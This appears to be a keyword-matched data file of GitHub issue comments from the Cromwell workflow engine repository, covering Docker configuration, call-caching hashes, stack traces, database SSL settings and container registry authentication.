Security,"Looking at this with Cromwell 24, the user can be specified with a config like:. ```; default = ""Local""; providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; String? docker; String? docker_user; """"""; submit-docker = """"""docker run --rm ${ ""--user "" + docker_user } -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash ${docker_cwd}/execution/script""""""; .; .; .; ```. The WDL can pass in `docker_user` as a runtime attribute, which could be an expression involving an input or just a hardcoded value. But even with a container path not under `/root`, there are currently permissions problems that prevent this from working due to the different users inside and outside the Docker container. It may be possible to `chmod` and `umask` our way past these problems, but I need to think through the security implications of doing so. Maybe making this more liberal behavior an opt-in configuration value in the backend config would be okay?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/472#issuecomment-271364535:878,secur,security,878,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/472#issuecomment-271364535,1,['secur'],['security']
Security,"Looks awesome to me. Thinking out loud.....:. - (PO q) If a hash lookup fails (i.e. I mean the dockerhub request, not the expression evaluation), not even starting the workflow might be the expected behaviour, because ""don't waste my money starting an entire analysis when in 2 minutes I can resubmit and get CC""?; - (Separate ticket?) Should we also have a ""disable docker hash cache"" option, for Lee's very-fast iterations? Or just a ""clear hash cache"" REST endpoint?; - ToL: The hash lookup cache may also need to be aware of local vs remote hashes; - ToL: one step further away from dynamic backend assignment 😢",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-283975797:60,hash,hash,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-283975797,10,['hash'],"['hash', 'hashes']"
Security,"Looks good to me. I tried to make some sense of this compiler error this morning. One thing to note is that `sbt compile` does work, but it's the assembly that seems to be creating the issues. Judging from the output of `sbt assembly`, I think perhaps it could be a conflict with another library, because it seems to have the error immediately after importing a bunch of JARs:. ```; ...; [info] Including: jackson-jaxrs-json-provider-2.4.1.jar; [info] Including: jackson-module-jsonSchema-2.4.1.jar; [info] Including: jackson-jaxrs-base-2.4.1.jar; [error] missing or invalid dependency detected while loading class file 'WorkflowStatusResponse.class'.; [error] Could not access type AnyRef in package scala,; [error] because it (or its dependencies) are missing. Check your build definition for; [error] missing or conflicting dependencies. (Re-run with `-Ylog-classpath` to see the problematic classpath.); [error] A full rebuild may help if 'WorkflowStatusResponse.class' was compiled against an incompatible version of scala.; [error] missing or invalid dependency detected while loading class file 'WorkflowSubmitResponse.class'.; [error] Could not access type AnyRef in package scala,; [error] because it (or its dependencies) are missing. Check your build definition for; [error] missing or conflicting dependencies. (Re-run with `-Ylog-classpath` to see the problematic classpath.); [error] A full rebuild may help if 'WorkflowSubmitResponse.class' was compiled against an incompatible version of scala.; [error] two errors found; [error] (test:compileIncremental) Compilation failed; [error] Total time: 32 s, completed Jun 2, 2015 8:39:34 AM; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/30#issuecomment-107940395:671,access,access,671,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/30#issuecomment-107940395,2,['access'],['access']
Security,"Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [error] Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94); at",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:2274,secur,security,2274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['secur'],['security']
Security,"Managed to fix the problem. Cromwell 32 errorred and explained the problem. The filesystem section was moved to the SGE section. Are config file now looks like this:; ```HOCON; backend {; default=""SGE""; providers {; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10000; runtime-attributes= """"""; Int? cpu=1; Int? memory=4; """"""; submit = """"""; qsub \; -terse \; -V \; -b n \; -wd ${cwd} \; -N ${job_name} \; ${'-pe BWA ' + cpu} \; ${'-l h_vmem=' + memory + ""G""} \; -o ${out} \; -e ${err} \; ${script}; """"""; kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)"". filesystems {; local {; localization: [; ""soft-link"", ""copy"", ""hard-link""; ]; caching {; duplication-strategy: [ ""soft-link"", ""copy"", ""hard-link"" ]; hashing-strategy: ""file""; }; }; }; }; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3109#issuecomment-402984197:819,hash,hashing-strategy,819,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3109#issuecomment-402984197,1,['hash'],['hashing-strategy']
Security,"Maybe an example would also help:; ```wdl; workflow foo {; ...; runtime {; memory: ""2GB"" # ignored for call caching; }; }; ```. ```wdl; workflow foo {; String memory_string # hashed for call caching; runtime {; memory: memory_string # still ignored for call caching; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2927#issuecomment-348295352:175,hash,hashed,175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2927#issuecomment-348295352,1,['hash'],['hashed']
Security,Merge to develop gated on a BT-219 release of Martha that supports access urls.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6312#issuecomment-827658854:67,access,access,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6312#issuecomment-827658854,1,['access'],['access']
Security,Messages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Class cromwell.services.womtool.impl.WomtoolServiceInCromwellActor for service Womtool cannot be found in the class path.; 	at cromwell.services.ServiceRegistryActor$.serviceProps(ServiceRegistryActor.scala:54); 	at cromwell.services.ServiceRegistryActor$.$anonfun$serviceNameToPropsMap$2(ServiceRegistryActor.scala:37); 	at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); 	at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:231); 	at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:462); 	at scala.collection.TraversableLike.map(TraversableLike.scala:234); 	at scala.collection.TraversableLike.map$(TraversableLike.scala:227); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:36); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; Caused by: java.lang.ClassNotFoundException: cromwell.services.womtool.impl.WomtoolServiceInCromwellActor; 	at java.net.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:4057,Hash,HashMap,4057,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,2,['Hash'],"['HashMap', 'HashTrieMap']"
Security,"NB I think this should be renamed to ""... into `validate()` on the `BackendWorkflowInitializationActor`"" :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/651#issuecomment-209968612:48,validat,validate,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/651#issuecomment-209968612,1,['validat'],['validate']
Security,"NB this didn't happen when the `[0]` wasn't part of the output declaration. If I had to guess, I'd say the FileEvaluator is looking for GlobFiles to expand, but is missing this one because it looks like an array member access rather that a GlobFile type.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1980#issuecomment-280026759:219,access,access,219,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1980#issuecomment-280026759,1,['access'],['access']
Security,"New info since our meeting earlier today:. I was able to confirm that Batch actually *can* pull and run Docker Image Format v1 images (PR to explicitly assert this [here](https://github.com/broadinstitute/cromwell/pull/7522)). So that does not appear to be the source of my private Docker woes. I also pushed a new image that is just a re-tag of `ubuntu:latest` to `broadinstitute/cloud-cromwell:2024-08-30`. Trying to run with that, with or without the `docker.io/` prefix results in the error:. ```; docker: Error response from daemon: pull access denied for broadinstitute/cloud-cromwell, repository does not exist or may require 'docker login': denied: requested access to the resource is denied. ```. which is a complaint about being able to access the repository, not the format of a particular image within the repository. Not sure what's going on here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095:543,access,access,543,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095,3,['access'],['access']
Security,"New thoughts/additional info. . I just tried a workflow that evaluates all the way to the end successfully (and had been run before on the same data and no, call caching didn't happen, as is expected with AWS backend), with the exception of adding workflow options to specify the output and logs directories for the final results. . Interestingly enough the new prefixes were generated but files were not transferred over EXCEPT for the log. The workflow log transferred just fine. In the log there appears to be no errors or indication that the intended outputs were not successfully transferred over. . I'm looking at the workflow status, and while all the files were made correctly (so all tasks completed successfully), but the workflow as a whole failed b/c it knows it failed to transfer over the output data. However again, there are no errors indicated in the metadata indicating why no files were copied. . I'm wondering if this too would be expected to be a hashing failure? Are the identities of the files created that are intended as outputs defined by the hashing? Would this behavior be expected given the current issues with call caching? Or is this a new issue?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-462857084:968,hash,hashing,968,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-462857084,2,['hash'],['hashing']
Security,"Not 100% sure what wasn't working at what point. I suspect that based on the order of the original commits<sup>1</sup>, the `RunMysql` and server should have both worked at ""4."". At that point I believe the config `url` still contained `useSSL=true`, the application config was being passed on the command line, and the mysql jdbc code should have been in the main assembly. By the time I was running ""11."" earlier today, the configuration `url` no longer contained `useSSL=true`, and connections within `SlickDataAccess` were returning the error combo:. ```; java.sql.SQLTimeoutException: Timeout after 1000ms of waiting for a connection.; ...; Caused by: java.sql.SQLException: Access denied for user '…'@'…' (using password: YES); ```. I did add another variable in ""11."" by always testing with `useSSL=true&requireSSL=true`, but according to the [logs](http://pastebin/209) of the latest 'RunMysql', `jdbcMain` and `jdbcRequireSsl` passed. So that _shouldn't_ have changed the results. Meanwhile, all test combinations of setting ssl worked for both slick and raw datasource connections, in tests via the url (*Ssl*), or via the dataSource properties (*Prop). So I think just setting back the `useSSL=true` is the minimum required fix, but I'd prefer to see `requiredSSL=true` added as well, as was successfully run in `slickSslDriver`. <sup>1</sup> What I believe is the previous order of the commits:; 1. Updated run.sh to pass in the mysql key & trust stores.; 2. log database config; 3. make mysql not test-only; 4. Add config file option in run.sh to make container use custom configuration; 5. debugging ""script""; 6. log actual uniquified config; 7. Test at JDBC level.; 8. hardcode use of SSL; 9. count rows in WORKFLOW_EXECUTION; 10. Logging the just the URL in SlickDataAccess, not the entire config.; 11. Added a suite of mysql ssl test.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/85#issuecomment-123520815:680,Access,Access,680,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/85#issuecomment-123520815,2,"['Access', 'password']","['Access', 'password']"
Security,"Not really for this PR I think, but looking at the `validateInputs` method, it only validates the inputs if a file was passed (makes sense), but if no input file is specified and the WDL does need an input, validation will return success, which is weird IMO.; @geoffjentry My 2 cents are I personally prefer having small short-lived actors instead of a singleton actor that handle all the requests. I think it's more robust, faster, and less leading towards godlike actors.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195393365:52,validat,validateInputs,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195393365,3,['validat'],"['validateInputs', 'validates', 'validation']"
Security,"Not super urgent, but yes I agree. Ideally we would have access to each of the hashes that get hash cached so we could compare them later to see if things changed (i.e. file hashes, other input hashes, docker image hashes, etc)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-256449537:57,access,access,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-256449537,6,"['access', 'hash']","['access', 'hash', 'hashes']"
Security,"Not sure if this is a separate issue or not, but when @knoblett and I were submitting a workflow yesterday we got the exact same error message (submitted with Swagger). The issue for her was that there was an input that was specified to be a File type, but in reality it was just a String (so I'm guessing the issue was similar in that it couldn't find the ""file""). Unfortunately, it validated just fine, but we weren't able to submit it. . I'd be happy to provide the WDL and JSON files (both the broken version and the fixed version) but they won't attach in a github comment.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/703#issuecomment-209931581:384,validat,validated,384,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/703#issuecomment-209931581,1,['validat'],['validated']
Security,"Note for future tech talk: The hash lookup will not work for private images when running locally, even though the job might run fine. This is because when running locally, as long as the user is logged in properly (with `docker login` or `gcloud login`), the docker command will be able to retrieve the image. However Cromwell does not go look for the user's docker config file on the machine to extract the auth information and use it when looking up the hash.; Another option would be to allow explicit declaration of authentication strategies in the config file (like we have for google). Currently only JES has a `dockerhub` entry. It could be generalized at the root level with something like; ```. dockerhub {; auths [; {; # this would look at ~/.docker/config.conf for example; name = ""application-default""; scheme = ""application_default""; },; {; name = ""custom""; scheme = ""custom""; account = ""bla""; token = ""bla""; }; ]; }; ```. and then any backend could do. `dockerhub-lookup.auth = ""application-default""`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1969#issuecomment-279087577:31,hash,hash,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1969#issuecomment-279087577,3,"['authenticat', 'hash']","['authentication', 'hash']"
Security,"Note to self- should also validate that the new `Finalizing` workflow state doesn't have unexpected consequences for Rawls and/or the UI (and if it does, I might need to revert)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6196#issuecomment-785993818:26,validat,validate,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6196#issuecomment-785993818,1,['validat'],['validate']
Security,"Note: the upgraded 1.0 version of this workflow passed validation, so it's something specific to the draft-2 WDL implementation",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3885#issuecomment-404899951:55,validat,validation,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3885#issuecomment-404899951,1,['validat'],['validation']
Security,"Note:. As it stands, this PR could return false positives for a workflow that has been archived from metadata but still has a summary. I think this is already true for the function converted in https://github.com/broadinstitute/cromwell/pull/4617. I'm not sure whether it's a problem per se, but certainly notable. **Update**: based on the analysis in https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053 the old function `validateWorkflowIdInMetadata` already returns `true` for archived workflows.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2435487930:447,validat,validateWorkflowIdInMetadata,447,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2435487930,1,['validat'],['validateWorkflowIdInMetadata']
Security,"Note:. There exists an optional namespace cache in the WDL draft-2 version of `validateNamespace`. WaaS uses only `getWomBundle` and `createExecutable`, so it currently has no interaction with the cache for any language version.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458589241:79,validat,validateNamespace,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458589241,1,['validat'],['validateNamespace']
Security,"OK so can we add validatation for the existence and readability of Files in the workflowinputs.json up front? If there are any issues with shell metacharacters those would be exposed, and I agree that these changes shouldn't have affected the way those are handled.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/249#issuecomment-151545351:17,validat,validatation,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/249#issuecomment-151545351,2,"['expose', 'validat']","['exposed', 'validatation']"
Security,"OK. Let's hard code a `version ""28.1""` in the formula even though it won't match the URL, since that will prevent the checksum error.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2463#issuecomment-316067289:118,checksum,checksum,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2463#issuecomment-316067289,1,['checksum'],['checksum']
Security,"Oh I see, insertion order in a map is definitely NOT preserved currently. They're backed by a classic unsorted HashMap. There would probably be performance implications if we were to switch to LinkedHashMap or a TreeMap to preserve order but maybe a `sort` function on arrays could make this easier.; Tagging @cjllanwarne who might want to chime in as this relates cloesly to WDL.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368531271:111,Hash,HashMap,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368531271,1,['Hash'],['HashMap']
Security,"Oh right, I forgot about this comment... sorry :sweat_smile: The issue turned out to be with the call-caching strategy we were using. Because there were a lot of files being created, cromwell needed to do a large amount of hashing, which used up all of the available CPUs eventually leading to the timeouts. We changed the call-caching strategy and are no now longer running into this error.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-432255713:223,hash,hashing,223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-432255713,1,['hash'],['hashing']
Security,"Oh, and the next part of the plan is to delete the buckets to simplify the audit. That's the real purpose here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7533#issuecomment-2334841724:75,audit,audit,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7533#issuecomment-2334841724,2,['audit'],['audit']
Security,"Ok, just for clarification I will do the following:; 1. Remove validateRuntimeValue from wdl4s and create a PR in that repo.; 2. Add validateMemoryValue to JesInitializationActor.; 3. Refactor validateMemoryValue to return similar message than the other ones.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212581683:63,validat,validateRuntimeValue,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212581683,3,['validat'],"['validateMemoryValue', 'validateRuntimeValue']"
Security,"Ok, running the Docker daemon as root is normal (the docs says it's [required](https://docs.docker.com/engine/security/security/), actually). The issues with non-root default users should be fixed in [this PR](https://github.com/broadinstitute/cromwell/pull/1865), but that code is currently only on develop (the forthcoming 25 release). non-root default users should Just Work with the code from that PR, you shouldn't have to make any changes to your config. The `master` branch corresponds to the 24 release; do you mean you're running the 23 release?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2034#issuecomment-283009835:110,secur,security,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2034#issuecomment-283009835,2,['secur'],['security']
Security,"Okay so my understanding of this so far (I'm just reiterating what you have in your diagram for my own benefit):. `ShadowWorkflowActor` has 4 ""lifecycle"" states as actors:; - `MaterializeWorkflowDescriptorActor` - basic validation and `WorkflowDescriptor` creation; - `EngineWorkflowInitializationActor` - spawns 1 or more `BackendWorkflowInitializationActor`, then aggregates results from all of these and message back `ShadowWorkflowActor`; - `EngineWorkflowExecutionActor` - sent a Start or Restart message, performs the execution, sends back result of execution. Spawns `BackendWorkflowExecutionActor`s; - `EngineWorkflowFinalizationActor` - do post-workflow termination actions. Spawns `BackendWorkflowFinalizationActor`s. _I'm just thinking out loud here... if you think this is stupid, I won't feel bad if you ignore me_. I guess the only comments on this scheme are about naming... . I feel like `MaterializeWorkflowDescriptorActor` should follow the same naming scheme and maybe be called something like `EngineWorkflowDescriptorActor` or `EngineWorkflowParserActor`. I'm also not a huge fan of prepending `Engine` onto these actors... maybe we can just drop `Engine`?; - `WorkflowDescriptorActor`; - `WorkflowInitializationActor`; - `WorkflowExecutionActor`; - `WorkflowFinalizationActor`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-209515545:220,validat,validation,220,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-209515545,1,['validat'],['validation']
Security,"On hold for now. Using regular auth this appears to work manually but not in code. e.g. doing something like [this](https://docs.aws.amazon.com/AmazonECR/latest/userguide/Registries.html#registry_auth):. ```; TOKEN=$(aws ecr get-authorization-token --output text --query 'authorizationData[].authorizationToken'); curl -i -H ""Authorization: Basic $TOKEN"" https://952500931424.dkr.ecr.us-east-1.amazonaws.com/v2/broadinstitute/cromwell/manfests/latest; ```. returns a blob of JSON containing all sorts of manifesty-looking data. However this doesn't seem to match up exactly with what the current code is doing: . * ~The current code sets `Bearer` auth, but that `curl` command works with `Basic` and not `Bearer`.~ Fixed, that was easy enough; * The current code expects to find the digest in the returned headers. However the digest is in the body and not the headers. It looks like having the `digest` in a `config` block is part of the spec so perhaps the existing code can actually parse and fall back on this if the digest isn't in the headers: https://docs.docker.com/registry/spec/manifest-v2-2/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4864#issuecomment-486798910:229,authoriz,authorization-token,229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4864#issuecomment-486798910,4,"['Authoriz', 'authoriz']","['Authorization', 'authorization-token', 'authorizationData', 'authorizationToken']"
Security,"On your last question, yeah that's basically it (although there was a request by Lee to refer to it as a `Path` and there was even some discussion that perhaps it should be cloud URL only so e.g. `CloudPath`). Despite the nomenclature the idea would be a type which would be treated as a String except that Cromwell would understand that it represents a file for things like call caching and handle them appropriately. Unlike a `File` the underlying path is never localized, it's always maintained as-is. Coercion between `File` and this new type would be seamless. I'll use `FileRef` for examples w/o necessarily endorsing that term. In a much simpler example where you have a single `FileRef` it'd be treated just like a `String` when it came to a command block, e.g. task foo {; FileRef bar; File baz. command {; grep ${bar} ${baz}; }; }. This would be grepping the delocalized path referenced by `bar` in the contents of the localized file `baz`. For the `Array[FileRef]`/`writelines()` examples, the belief was that if the writelines was in the command block (or the declaration? crap, now I forget which) that call caching would work as desired as the individual `FileRef`s would have their hashes checked *prior* to the FOFN generation. Moving away from your specific situation, I alluded to `CloudPath` above. The reason this came up in a separate context was e.g. GATK4's NIO capability where one doesn't want to be localizing files but does want call caching to be in effect. So there was a request for this concept of a file like thing which stays where it originally is. Some tricky edge cases start coming up when you're talking about actual local files for this and all the examples people came up with were people using cloud based storage, thus .....",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305979013:1197,hash,hashes,1197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305979013,2,['hash'],['hashes']
Security,"Ooop, I might have misspoke. I thought the copy strategy did actually log that it was copying, but I realised that what I was seeing was that the `hard link` had failed, and knew that it was copying based on that:. > `WARN - Localization via hard link has failed: /path/to/destination.file -> /path/to/original.file: Invalid cross-device link`. I think it still might be useful, but I realise there's actually no precedent here. ---. Oh, so the path+modtime sort of just works? I was under the impression it wouldn't for those cache-strategies. I don't know if it wouldn't try, or would never succeed because I never tried, but here's what the [docs say](https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options):. > - ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; > - ""path+modtime"" will compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here. Thanks for the reply!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-508309219:769,hash,hash,769,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-508309219,2,['hash'],['hash']
Security,Oops I just opened #1888 which is effectively a dup of this. I'll just add some notes here instead. We discussed in person that the key stakeholders wanted this to always happen a couple of times and that we would not expose this as an option for now. . IMO I would prefer to see this sort of JES-backend-specific retrying being handled as part of the backend's responsibility. I haven't looked closely at the code to assess how much that desire makes sense,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1849#issuecomment-274350954:218,expose,expose,218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1849#issuecomment-274350954,1,['expose'],['expose']
Security,"Overall I'm liking the `Validation` angle to these changes, this seems like a nice system which could be used in other spots in Cromwell. I think the attribute parsing could be made more tolerant so that Kristian's examples of `8G` and `8GB` actually would parse, but that's orthogonal to getting helpful error messages when something is unparseable. I'm happy to address more tolerant parsing in a separate PR. Also, it feels like the case classes might have been overused in these changes; they aren't replacing type aliases but are wrapping what used to be raw types. This does buy some added type safety in . ``` scala; (failOnStderr |@| cpu |@| preemptible |@| disks |@| memory){ RuntimeAttributes(docker, zones, _, _, _, _, _) }; ```. But then everywhere else there's noise for boxing and unboxing the raw types to and from these case classes.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/163#issuecomment-135972385:24,Validat,Validation,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/163#issuecomment-135972385,1,['Validat'],['Validation']
Security,"P.S. the current docs advise including the sha256 hash in the docker runtime spec:; https://cromwell.readthedocs.io/en/stable/tutorials/Containers/#image-versions; Which makes sense, but unfortunately right now it seems to disable caching (at least with the Local backend).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4912#issuecomment-488707414:50,hash,hash,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4912#issuecomment-488707414,1,['hash'],['hash']
